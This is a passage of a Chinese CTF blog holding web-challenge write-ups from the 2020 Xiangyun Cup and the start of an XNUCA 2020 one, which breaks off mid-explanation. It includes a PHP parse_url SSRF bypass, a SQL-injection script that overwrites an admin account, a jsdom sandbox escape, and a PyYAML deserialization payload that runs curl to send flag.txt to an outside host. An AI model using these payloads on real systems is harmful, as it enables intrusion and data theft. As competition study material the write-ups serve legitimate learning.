class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(safe_url(<span class="variable">$url</span>,<span class="variable">$safe</span>)) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$co</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$co</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">curl(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>emmm，这题是原题。<a target="_blank" rel="noopener" href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">https://tyaoo.github.io/2020/08/31/2020-GACTF-web/</a> ,我是后来才知道的。。。。</p>
<p>绕过端口限制的方法一种是：<code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code></p>
<p>还有一个是：<code>http:/ctf.ccreater.top:5000/</code></p>
<p><code>var_dump(parse_url)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;scheme&#x27; =&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  &#x27;path&#x27; =&gt;</span><br><span class="line">  string(23) &quot;/ctf.ccreater.top:5000/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后curl去访问是正常的</p>
<p>接下来按着那个wp走发现flask,继续ssrf，发现redis，原本是wp里面的redis主从复制RCE直接打这题的，但是试了好久都没成功，明明有向我发送数据</p>
<p>redis ssrf还有一种RCE方法是写文件，这一题就是这么干的，因为那个wp我一直没往这方面想</p>
<p>然后去看了写redis发现它的版本是2.x主从复制RCE的那个exp是针对3.x和4.x  ：(</p>
<h2 id="easyzzz"><a href="#easyzzz" class="headerlink" title="easyzzz"></a>easyzzz</h2><p>百度一波网上的cve解出这题</p>
<p>简单说下过程</p>
<p>/plugins/webuploader/js/webconfig.php</p>
<p>拿到后台地址  admin539/</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7414">https://xz.aliyun.com/t/7414</a> ，利用前台sql注入修改管理员密码</p>
<p>搭个转发的方便测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span>(<span class="params">exp</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://eci-2ze9cofh8j38ebxctduq.cloudeci1.ichunqiu.com:80/plugins/sms/sms_list.php?act=del&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;</span>: <span class="string">&quot;1604567758,1604568322,1604568358,1605921830&quot;</span>, <span class="string">&quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;</span>: <span class="string">&quot;1606016268&quot;</span>, <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;3fe85864bb4ad1dc9f25e5271281baf9&quot;</span>, <span class="string">&quot;__jsluid_h&quot;</span>: <span class="string">&quot;85077cc270ca34654c02f2479fcb9390&quot;</span>, <span class="string">&quot;zzz254_adminpass&quot;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;id[=&#123;exp&#125; ;-- ]&quot;</span>.<span class="built_in">format</span>(exp=exp): <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    payload = request.args.get(<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    r=access(payload)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>



<p>直接访问:</p>
<p><code>http://127.0.0.1:5000/?exp=1;replace INTO zzz_user(uid,u_gid, u_lid, u_onoff, u_order, sex, username, password, question, answer, regtime, truename, face, province, city, district, address, post, tel, mobile, email, qq, u_desc, adminrand, lastlogintime, lastloginip, logincount, sysinfo, points, balance) VALUES (1, 1, 1, 1, 0, &#39;%E7%94%B7&#39;, &#39;admin&#39;, &#39;1ccbbb718e0e9c3a&#39;, &#39;8TBRJ2H5NXW57EVF&#39;, &#39;S8DDQC9YV494G84Q&#39;, &#39;&#39;, &#39;%E5%88%9B%E5%A7%8B%E4%BA%BA&#39;, &#39;face01.png&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;6a79122eab1e8abd10bcabd91ebbc36c&#39;, &#39;2020/11/22 17:25:13&#39;, &#39;127.0.0.1&#39;, 6, &#39;&#39;, 0, 0);--</code></p>
<p>修改admin密码为041676</p>
<p>没有写权限，但是我们只要读到flag就好了，利用这个cms的模板渲染机制，修改模板为我们想读的文件/flag，来拿到flag</p>
<h2 id="profile-system"><a href="#profile-system" class="headerlink" title="profile system"></a>profile system</h2><p>一看就是一个flask(它的cookie)，文件上传可以目录穿越，猜测后端访问uploads路由是这样的：<code>/uploads/&lt;path:path&gt;</code><br>直接读取<code>/uploads/../app.py</code></p>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect, send_file,session,render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = os.path.join(os.curdir, <span class="string">&quot;uploads&quot;</span>)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;Th1s_is_A_Sup333er_s1cret_k1yyyyy&#x27;</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;yaml&#x27;</span>,<span class="string">&#x27;yml&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;priviledge&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;home&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        flash(<span class="string">&#x27;No selected file&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> (allowed_file(file.filename) <span class="keyword">in</span> ALLOWED_EXTENSIONS):</span><br><span class="line">        flash(<span class="string">&#x27;Please upload yaml/yml only.&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">        filename = file.filename</span><br><span class="line">        session[<span class="string">&#x27;filename&#x27;</span>] = filename </span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> os.path.join(dirname, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    dirname = md5(request.remote_addr.encode()).hexdigest()</span><br><span class="line">    realpath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], dirname,session[<span class="string">&#x27;filename&#x27;</span>]).replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;priviledge&#x27;</span>] ==<span class="string">&#x27;elite&#x27;</span> <span class="keyword">and</span> os.path.isfile(realpath):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(realpath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">b&quot;^[ -\-/-\]a-&#125;\n\r]*$&quot;</span>,data, flags=re.MULTILINE):</span><br><span class="line">                    info = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;elite-user&#x27;</span>&#125;</span><br><span class="line">                    flash(<span class="string">&#x27;Sth weird...&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info = yaml.load(data)</span><br><span class="line">                <span class="keyword">if</span> info[<span class="string">&#x27;user&#x27;</span>] == <span class="string">&#x27;Administrator&#x27;</span>:</span><br><span class="line">                    flash(<span class="string">&#x27;Welcome admin!&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> ()</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            info = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;elite-user&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        info = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;guest&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&#123;&#123;user&#125;&#125;&quot;</span>,user=info[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line"><span class="comment">#.,^,_,`,~</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>,threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>有了secret我们就可以任意伪造session了</p>
<p>注意到：<code>info = yaml.load(data)</code></p>
<p>直接使用这个会有个提醒</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201122221248.png" alt="image16652"></p>
<p>百度一下为啥不安全，yaml反序列化注入get</p>
<p>直接抄来一个exp</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:type</span></span><br><span class="line">  <span class="attr">args:</span> [<span class="string">&quot;z&quot;</span>, <span class="type">!!python/tuple</span> [], &#123;<span class="attr">&quot;extend&quot;:</span> <span class="type">!!python/name:exec</span> &#125;]</span><br><span class="line">  <span class="attr">listitems:</span> <span class="string">&quot;\x5f\x5fimport\x5f\x5f(&#x27;os&#x27;)\x2esystem(&#x27;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>



<p>看下进入<code>info = yaml.load(data)</code> 的前提</p>
<p><code>re.fullmatch(b&quot;^[ -\-/-\]a-&#125;\n\r]*$&quot;,data, flags=re.MULTILINE)</code></p>
<p>利用<a target="_blank" rel="noopener" href="https://regex101.com/">regex101</a>读懂这个的意思，其实就是禁止出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.^_`~</span><br></pre></td></tr></table></figure>

<p>这几个字符</p>
<p>这个payload完美符合所有条件</p>
<p>一定要注意payload不能出现\r</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的float类型有两个特殊的值：nan(not a number),inf(infinity,无穷)</p>
<p><strong>php parse_url 小trick</strong></p>
<p><code>var_dump(parse_url(&quot;http:/ctf.ccreater.top:5000/&quot;))</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;scheme&#x27; =&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  &#x27;path&#x27; =&gt;</span><br><span class="line">  string(23) &quot;/ctf.ccreater.top:5000/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code>:<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=77991">https://bugs.php.net/bug.php?id=77991</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var_dump(parse_url(&quot;http://foo@127.0.0.1:6379%20@www.baidu.com&quot;));</span><br><span class="line">php shell code:1:</span><br><span class="line">array(4) &#123;</span><br><span class="line">  &#x27;scheme&#x27; =&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  &#x27;host&#x27; =&gt;</span><br><span class="line">  string(13) &quot;www.baidu.com&quot;</span><br><span class="line">  &#x27;user&#x27; =&gt;</span><br><span class="line">  string(13) &quot;foo@127.0.0.1&quot;</span><br><span class="line">  &#x27;pass&#x27; =&gt;</span><br><span class="line">  string(7) &quot;6379%20&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>python 中的yaml.load也存在反序列化问题</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/11/23/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" data-id="ckw7zwbz7000kfmolbrl33bgp" data-title="2020祥云杯web题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-XNUCA_2020_oooooooldjs题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/12/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-12T16:00:00.000Z" itemprop="datePublished">2020-11-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/12/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XNUCA-2020-oooooooldjs题解-md"><a href="#XNUCA-2020-oooooooldjs题解-md" class="headerlink" title="XNUCA_2020_oooooooldjs题解.md"></a>XNUCA_2020_oooooooldjs题解.md</h1><p>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221388">安全客</a></p>
<p>题目描述</p>
<blockquote>
<p><code>npm audit</code> may miss something, be careful of the version of <code>lodash</code>. There is prototype pollution in <code>express-validator</code>, limited but powerful。</p>
</blockquote>
<p>npm audit发现lodash有原型链污染漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Run  npm update lodash --depth 2  to resolve 1 vulnerability</span><br><span class="line">                                                              </span><br><span class="line">  Low             Prototype Pollution                         </span><br><span class="line">                                                              </span><br><span class="line">  Package         lodash                                      </span><br><span class="line">                                                              </span><br><span class="line">  Dependency of   express-validator                           </span><br><span class="line">                                                              </span><br><span class="line">  Path            express-validator &gt; lodash                  </span><br><span class="line">                                                              </span><br><span class="line">  More info       https://npmjs.com/advisories/1523      </span><br></pre></td></tr></table></figure>



<p>在<a target="_blank" rel="noopener" href="https://snyk.io/test/npm/express-validator/2.21.0%E4%B8%AD%E6%9F%A5%E7%9C%8Blodash%E4%B8%AD%E5%87%BA%E7%8E%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E4%BE%9D%E6%AC%A1%E4%B8%8B%E6%96%AD%E7%82%B9">https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点</a></p>
<p>传入json数据:<code>&#123;&quot;233&quot;:123&#125;</code>发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png" alt="image1151"></p>
<p>调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染</p>
<p>一波测试后得到原型链污染的payload:<code>&#123;&quot;.\&quot;].__proto__[\&quot;crossDomain&quot;:&#123;&quot;1&quot;:&quot;2&quot;&#125;&#125;</code>，但是不能控制原型链污染的值</p>
<p>审计题目代码发现，非常有意思的两个地方</p>
<ol>
<li><p>显眼的dangerous<br><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png" alt="image1432"></p>
</li>
<li><p>这里自己实现了数据库的CURD四种方法</p>
</li>
</ol>
<p>学习了一波后发现第一点可以触发RCE</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; JSDOM &#125; = <span class="built_in">require</span>(<span class="string">&quot;jsdom&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> JSDOM(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    const outerRealmFunctionConstructor = Node.constructor;</span></span><br><span class="line"><span class="string">    const process = new outerRealmFunctionConstructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">    const require = process.mainModule.require;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // Game over!</span></span><br><span class="line"><span class="string">    const fs = require(&#x27;fs&#x27;);</span></span><br><span class="line"><span class="string">    console.log(fs.readdirSync(&#x27;.&#x27;));</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">`</span>, &#123; </span><br><span class="line">  <span class="attr">runScripts</span>: <span class="string">&quot;dangerously&quot;</span> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<p>在util.js中定义了唯一会用到jsdom的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">	JSDOM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;jsdom&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">	<span class="built_in">window</span></span><br><span class="line">&#125; = <span class="keyword">new</span> JSDOM(<span class="string">``</span>, &#123;</span><br><span class="line">	<span class="attr">url</span>: originUrl,</span><br><span class="line">	<span class="attr">runScripts</span>: <span class="string">&quot;dangerously&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// server side `$` XD</span></span><br><span class="line"><span class="keyword">const</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;jquery&#x27;</span>)(<span class="built_in">window</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> requests = <span class="keyword">async</span> (url, method) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		result = <span class="keyword">await</span> $.ajax(&#123;</span><br><span class="line">			<span class="attr">url</span>: url,</span><br><span class="line">			<span class="attr">type</span>: method,</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">console</span>.log(result)</span><br><span class="line">	&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">		<span class="built_in">console</span>.log(err)</span><br><span class="line">		result = &#123;</span><br><span class="line">			<span class="attr">data</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本</p>
<p>调试jquery代码发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg" alt="image2617"></p>
<p>这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png" alt="image2751"></p>
<p>如果s.crossDomain == null就会进入是否跨域的判断</p>
<p>利用前面的原型链污染从而绕过jquery的跨域限制</p>
<p>还剩下一个问题，我们如何传入自己的url</p>
<p>express开着一个中间件限制了我们url,而且也不让更新url类型的数据</p>
